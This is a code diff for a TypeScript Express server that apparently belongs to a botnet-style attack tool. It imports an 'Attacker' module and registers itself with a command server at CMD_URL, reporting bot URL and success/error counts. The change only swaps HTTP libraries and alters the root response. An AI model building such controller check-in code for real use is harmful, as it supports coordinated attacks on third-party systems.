@@ -3,7 +3,7 @@ import bodyParser from "body-parser";
 import { Stats } from "./stats";
 import { Attacker } from "./attacker";
 import cors from "cors";
-import superagent from "superagent";
+import request from "request";
 
 // Create Express server
 const app = express();
@@ -17,7 +17,7 @@ app.use(bodyParser.json());
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(cors({origin: '*',}));
 app.get('/', (req, res) => {
-    res.status(200).send("OK");
+    res.status(200).send(stats.isRun);
 });
 
 const sendUpdate = () => {
@@ -27,7 +27,11 @@ const sendUpdate = () => {
         }
 
         const url = `${process.env.CMD_URL}api/control/register`;
-        superagent.post(url).send({ botUrl: process.env.URL, loop: stats.loop, success: stats.success, error: stats.error }).end((err, res) => {
+        request.post({
+            url,
+            json: true,
+            body: { botUrl: process.env.URL, loop: stats.loop, success: stats.success, error: stats.error }
+        }, (err, res) => {
             if(err) {
                 console.error(err);
                 return;
